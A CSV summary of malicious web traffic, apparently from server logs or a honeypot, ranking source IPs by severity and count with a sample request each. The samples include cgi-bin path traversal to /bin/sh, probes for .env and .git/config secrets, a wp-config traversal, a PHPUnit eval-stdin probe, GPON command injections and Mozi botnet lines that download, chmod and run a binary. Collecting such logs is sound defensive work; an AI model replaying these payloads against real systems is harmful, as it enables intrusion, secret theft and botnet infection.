IP,SEVERITY,COUNT,SAMPLE_PAYLOAD
185.177.72.30,CRITICAL,849,"GET /admin/phpinfo.php HTTP/1.1"
204.76.203.125,CRITICAL,45,"GET /.env HTTP/1.1"
213.209.159.151,CRITICAL,44,"GET /new/.env HTTP/1.1"
134.65.30.157,CRITICAL,41,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
164.92.129.69,CRITICAL,41,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
31.206.48.120,CRITICAL,41,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
37.120.213.13,CRITICAL,41,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
45.61.134.40,CRITICAL,41,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
86.106.143.180,CRITICAL,17,"POST /wp-admin/admin-ajax.php?template=../../../../../../../wp-config&value=a&min_symbols=1 HTTP/1.1"
162.240.233.90,CRITICAL,12,"GET /bitrix/redirect.php?event1&event2&event3=download&goto=https://interact.sh HTTP/1.1"
192.159.99.95,CRITICAL,6,"POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1"
103.120.63.69,CRITICAL,1,"sh+/tmp/gpon80&ipv=0"
103.175.29.249,CRITICAL,1,"27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink."
117.254.100.80,CRITICAL,1,";sh+/tmp/gpon80&ipv=0"
124.131.119.83,CRITICAL,1,"27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink."
137.59.230.240,CRITICAL,1,";sh+/tmp/gpon80&ipv=0"
139.135.43.149,CRITICAL,1,";sh+/tmp/gpon80&ipv=0"
182.126.124.236,CRITICAL,1,"27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink."
182.127.64.105,CRITICAL,1,"27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink."
213.219.38.113,CRITICAL,1,"GET /inicio.shtml HTTP/1.1"
42.233.107.224,CRITICAL,1,"27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink."
103.203.72.214,CRITICAL,1,";sh+/tmp/gpon80&ipv=0"
117.209.31.78,CRITICAL,1,"27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink."
46.163.189.194,CRITICAL,1,";sh+/tmp/gpon80&ipv=0"
59.103.104.105,CRITICAL,1,";sh+/tmp/gpon80&ipv=0"
103.160.196.167,CRITICAL,1,"27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink."
185.196.10.225,HIGH,215,"\x16\x03\x01\x05\xC2\x01\x00\x05\xBE\x03\x03hz\xB7e\x1C\x98iT\xE6K\xA7\xD1\xD1\xE2\xD0\xDDa\x8Ci\xE3"
49.248.192.204,HIGH,59,"GET /api/.git/config HTTP/1.1"
82.165.66.87,HIGH,28,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
68.183.209.194,HIGH,25,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
78.153.140.224,HIGH,25,"GET /.env HTTP/1.1"
204.76.203.210,HIGH,23,"GET /.env HTTP/1.1"
40.113.19.56,HIGH,22,"GET /wp-admin/images/commentv.php HTTP/1.1"
173.249.15.69,HIGH,20,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
78.153.140.179,HIGH,20,"GET /.env HTTP/1.1"
185.177.72.64,HIGH,12,"GET /.env.development HTTP/1.1"
89.185.81.112,HIGH,11,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
159.65.119.52,HIGH,9,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
45.92.219.150,HIGH,9,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
45.139.104.140,HIGH,8,"GET /.env HTTP/1.1"
130.12.180.34,HIGH,8,"GET /.env HTTP/1.1"
185.177.72.56,HIGH,8,"GET /.env HTTP/1.1"
78.153.140.149,HIGH,8,"GET /.env HTTP/1.1"
139.64.167.210,HIGH,7,"GET /.env HTTP/1.1"
176.65.149.17,HIGH,7,"GET /.env.development HTTP/1.1"
34.158.168.101,HIGH,7,"GET /.env HTTP/1.1"
102.244.97.183,HIGH,6,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
128.199.103.139,HIGH,6,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
128.241.229.30,HIGH,6,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
35.216.189.16,HIGH,6,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03I*\xFFr\xC7+><\xBE\xC9\x83\xC6&\xE2%\x05\xC6\x8Ca\x05\x1"
47.85.49.48,HIGH,6,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
81.163.30.15,HIGH,6,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
104.234.32.26,HIGH,6,"GET /.env.development%20 HTTP/1.1"
173.239.240.77,HIGH,6,"GET /.env.development%20 HTTP/1.1"
213.199.46.10,HIGH,6,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
217.77.8.180,HIGH,6,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
84.200.154.218,HIGH,6,"GET /.env HTTP/1.1"
45.119.212.42,HIGH,6,"GET /public/.env HTTP/1.1"
157.245.53.22,HIGH,5,"GET /.env HTTP/1.1"
45.154.98.220,HIGH,5,"GET /.env HTTP/1.1"
62.171.164.240,HIGH,5,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
104.234.32.28,HIGH,5,"POST /.env HTTP/1.1"
173.239.240.65,HIGH,5,"GET /.env.old HTTP/1.1"
173.239.240.84,HIGH,5,"GET /application/.env HTTP/1.1"
86.48.30.152,HIGH,5,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
103.40.61.98,HIGH,4,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
104.236.9.62,HIGH,4,"GET /.env HTTP/1.1"
185.195.233.176,HIGH,4,"GET /.git/config HTTP/1.1"
193.5.44.36,HIGH,4,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
80.82.77.202,HIGH,4,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xDA\xCB M\xC4Q\x97\x86\x1B\x06\xBE\x84)M\xAF\x11\xD4K\x"
89.117.61.19,HIGH,4,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
103.103.21.109,HIGH,4,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
103.148.195.198,HIGH,4,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
104.234.32.33,HIGH,4,"GET /application/.env HTTP/1.1"
173.212.216.158,HIGH,4,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
173.239.240.63,HIGH,4,"GET /index.php?p=admin/dashboard HTTP/1.1"
173.239.240.69,HIGH,4,"GET /shared/.env%20 HTTP/1.1"
173.239.240.71,HIGH,4,"GET /rest/.env HTTP/1.1"
45.78.235.69,HIGH,4,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
66.116.205.19,HIGH,4,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
66.248.205.66,HIGH,4,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
67.213.118.179,HIGH,4,"GET /.env HTTP/1.1"
77.83.39.218,HIGH,4,"GET /.git/config HTTP/1.1"
94.26.88.31,HIGH,4,"GET /.env HTTP/1.1"
185.177.72.68,HIGH,4,"GET /.env.sample HTTP/1.1"
218.33.108.122,HIGH,4,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
102.244.97.186,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
115.190.29.141,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
123.233.245.135,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
13.79.87.25,HIGH,3,"GET /admins.php HTTP/1.1"
164.92.106.138,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
172.105.128.13,HIGH,3,"\x16\x03\x01\x01"
176.113.115.74,HIGH,3,"\x16\x03\x01\x02\x00\x01\x00\x01\xFC\x03\x03\x18\x83s\xC9L\xE6\x18\xF6\xA1\x04\xAF\xE3\xFB X\xED\xA6"
190.242.189.254,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
192.210.140.39,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
195.40.154.8,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
199.45.154.127,HIGH,3,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xC9&\xE4z=y\x9B\xDACtG\xF8B\xB2\x97\xB1\xE4\xA3\x04\x88"
217.154.69.208,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
23.94.26.208,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
24.65.233.27,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
37.202.236.248,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
45.135.193.11,HIGH,3,"\x16\x03\x01\x01\x0C\x01\x00\x01\x08\x03\x03\xA5i\xCC@=w\x17}\xC9^\xFB/\xAD\xC7N\xD2\xBC*N\xF9.\x96\"
45.192.110.181,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
45.33.80.243,HIGH,3,"\x16\x03\x01\x01"
45.78.235.68,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
59.7.246.67,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
85.11.183.6,HIGH,3,"\x16\x03\x01\x02\x00\x01\x00\x01\xFC\x03\x03\x8A\xF27\x88\x84\xF1K\xA7\x17|\xEA\xD1;\xC5\x95_\x7F\xC"
107.173.241.217,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
123.58.220.64,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
130.61.28.82,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
141.8.199.216,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
144.31.249.53,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
152.32.205.238,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
152.42.206.46,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
157.173.199.44,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
158.179.190.201,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
160.191.243.61,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
165.154.227.13,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
171.241.40.45,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
173.239.240.74,HIGH,3,"GET /.env HTTP/1.1"
173.239.240.76,HIGH,3,"GET /cp/.env HTTP/1.1"
173.239.240.79,HIGH,3,"GET /docker/.env HTTP/1.1"
175.200.104.40,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
177.70.2.220,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
181.176.14.90,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
185.118.143.154,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
185.128.139.52,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
185.141.107.177,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
190.124.153.17,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
192.250.228.42,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
198.46.146.200,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
206.183.129.205,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
207.244.238.54,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
212.64.216.215,HIGH,3,"GET /.env HTTP/1.1"
23.95.62.123,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
34.60.107.64,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
43.134.78.153,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
43.225.189.143,HIGH,3,"GET /.env HTTP/1.1"
45.78.235.71,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
45.85.146.175,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
47.113.149.86,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
47.253.183.81,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
47.90.209.221,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
49.233.13.171,HIGH,3,"GET /.git/config HTTP/1.1"
5.182.46.67,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
5.223.59.192,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
80.71.149.102,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
85.198.82.246,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
94.183.172.143,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
94.183.172.149,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
114.220.75.156,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
45.151.62.32,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
78.110.121.87,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
78.153.140.151,HIGH,3,"GET /.env HTTP/1.1"
78.153.140.156,HIGH,3,"GET /.env HTTP/1.1"
101.198.0.152,HIGH,2,"\x16\x03\x01\x015\x01\x00\x011\x03\x03&\x97d\xDA\xD5ghGq\xB5>\xB9|\xC9\xAC\xD2\xAC\xF2\x91\x11\x1C>\"
104.248.133.132,HIGH,2,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x031&\xB83\xF6b\x03T&\x02\xA3d\xE0\xDC\xAE~\x91\xF2J\x7F\xC2\xBB\"
139.59.230.234,HIGH,2,"GET /.env HTTP/1.1"
142.93.105.7,HIGH,2,"GET /.env HTTP/1.1"
142.93.146.232,HIGH,2,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xCD\xDC\xDD\x9E\xCD\xD3<\xF8\xC9\xBF}\xB0\xE3l!\x90S\x8BP\xCF"
142.93.93.42,HIGH,2,"GET /.env HTTP/1.1"
143.244.177.0,HIGH,2,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x97\xBE"
146.190.154.118,HIGH,2,"GET /.env HTTP/1.1"
147.185.132.100,HIGH,2,"\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03G\xEE\xED\x84}\x8E\xA2\x95\x1D1\x85\xB2\xE0\xDE\xB3$w"
147.185.132.225,HIGH,2,"\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03x\xBE\x97\xAA\xF0\xB2Hm\x00\x07s>\xFF\xDAe\x145\xF7~b\xE"
147.185.132.231,HIGH,2,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xA1\x9C^US\x1E\xD0#\xA7$0\xBA\x08\x84N\xD0\x00\x82T\xF2"
157.245.146.39,HIGH,2,"GET /.env HTTP/1.1"
158.94.211.104,HIGH,2,"\x16\x03\x01\x05\xC6\x01\x00\x05\xC2\x03\x03\xA9\x15 4\x1E\xC8\x7F>\xB4gcK\x80`\x0Cy\x1DPV\xE8\x02\x"
159.203.15.132,HIGH,2,"GET /.env HTTP/1.1"
159.203.37.2,HIGH,2,"GET /.env HTTP/1.1"
159.203.6.127,HIGH,2,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xD6\xDE\xD9\xF6\x8FK\x7F\xA4t\x00\xD1c\xB9\xD4/\x91\xD2w\x9EE"
159.203.95.90,HIGH,2,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xCC0\xF5\xD8\x99\xDD,\xE3\x97\x81\xF1\xD5\x18\x18w+*3C \xDCa\"
159.89.197.107,HIGH,2,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xF97\x22\x96\x1E}\x94\x90O.\x98\x81\xE9\xBF?\x15\xDFCC\xCB\xA"
162.142.125.120,HIGH,2,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03W\x82\xE7\x89\x18\xA8t\xF9\x06[\x9C\xA7\xE7\x85\xA2Z\xF6"
162.142.125.216,HIGH,2,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03PKl\x8F!\xF5\x198\xF5My\xB8 \x80`vV\xE3\xFE\xAB\xC2\x02\"
162.142.125.47,HIGH,2,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\x83\xCC\x82\x1F\xBA\xDE\x05 p\x1Al\xD8W\x049\xEC\x93@\x"
164.92.228.51,HIGH,2,"\x16\x03\x01\x01\x0C\x01\x00\x01\x08\x03\x03\xF7\x7F\xF4\xAE\x9A\xCFa*V\xB0\xDA\xBEm\x88\xA2\x9B\x97"
167.172.177.68,HIGH,2,"\x16\x03\x01\x01\x0C\x01\x00\x01\x08\x03\x03F\xE7*%g\x93'j\x95\x1A\xF9\xB7\xC9{\xD9\xAE7\xB0k\xCD\x8"
167.172.182.95,HIGH,2,"GET /.env HTTP/1.1"
167.71.235.128,HIGH,2,"GET /.env HTTP/1.1"
167.94.138.36,HIGH,2,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03k\xC0n\x92 \xF2\xD9\x00\x89\xC32\xB4\xEB-\xCE\xF6.\xEA\x"
167.94.138.51,HIGH,2,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03r\xAAS\xB4\xE8\x9AqI6\xA8\xD9\x9D\xD9=F\xB2\xDD\xB8\x12\"
167.94.146.49,HIGH,2,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03"
170.64.147.133,HIGH,2,"GET /.env HTTP/1.1"
172.104.11.34,HIGH,2,"\x16\x03\x01\x01"
172.104.11.51,HIGH,2,"\x16\x03\x01\x01"
172.236.228.193,HIGH,2,"\x16\x03\x01\x01"
172.236.228.220,HIGH,2,"\x16\x03\x01\x01"
172.236.228.222,HIGH,2,"\x16\x03\x01\x01"
172.236.228.39,HIGH,2,"\x16\x03\x01\x01"
176.32.195.85,HIGH,2,"\x16\x03\x02\x01o\x01\x00\x01k\x03\x02RH\xC5\x1A#\xF7:N\xDF\xE2\xB4\x82/\xFF\x09T\x9F\xA7\xC4y\xB0h\"
178.128.242.42,HIGH,2,"GET /.env HTTP/1.1"
180.93.228.84,HIGH,2,"GET /.env HTTP/1.1"
180.93.230.246,HIGH,2,"GET /.env HTTP/1.1"
18.219.216.206,HIGH,2,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xD9\x8B\xE1#\xC6\xD7\xDAo\x86\x7F\x1F\x1E\xCD\x1Ab\x95\xA7\xE"
184.105.247.196,HIGH,2,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x03.\xA2>\xC36\x05\x96^\xDA"
185.102.115.6,HIGH,2,"\x16\x03\x01\x00\xEA\x01\x00\x00\xE6\x03\x03\xB0\xBF\xA2}M\x83\xFDom\xA3\xFE\xA3\xF6<r\x8Ci\x06"
185.130.47.197,HIGH,2,"\x16\x03\x01\x00\xF2\x01\x00\x00\xEE\x03\x03\xD9Je\xA7*\xE33\xCD:\xEE\xE2\x94\xEF+\xA9g\x80\xF9F\xD2"
185.186.25.215,HIGH,2,"GET /.env HTTP/1.1"
185.213.174.141,HIGH,2,"\x16\x03\x01\x05\xA8\x01\x00\x05\xA4\x03\x03\x16\x5C\x87\xD4<\xE8\xE0R\xA7\xD4\x98\xD1C\x93\xC7I\xB3"
188.166.167.61,HIGH,2,"\x16\x03\x01\x01\x0C\x01\x00\x01\x08\x03\x03w\xB8n\x96\xC6\x8A\xBB\xD0\xA5\xEE\xF6r\x8AS}\x14+m\xCB\"
198.235.24.105,HIGH,2,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xFD(\x15C-\xD9\x8F\xE0\x01u\x90\x94\x97\xD1.\xB3\xC4[\x"
198.235.24.164,HIGH,2,"\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03\x8D\x00\xAA3\xF2\xA6&I`\xDEf2\xD8D\x0B\x1ED\xA3\x0C\x89"
198.235.24.182,HIGH,2,"\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03Q\xD2\xF5\xD2\xE4\x1F\x1C\x90T\xDF\x17.=\xD1\x05\xFEA\xD"
198.235.24.205,HIGH,2,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\x5C\x08\x0B\x0B\xD7\x04(\xAF\xCF\x95\xCEb\x9E"
198.235.24.225,HIGH,2,"\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03\xE2\xE9\xAB\x1D\xEE|V\xE22Mo\xCE"
198.235.24.45,HIGH,2,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\x19\xEA\xDAA\x96:5iqR#{\xD6\x85\x84\x0Ch\xA4=j\x01\x03\"
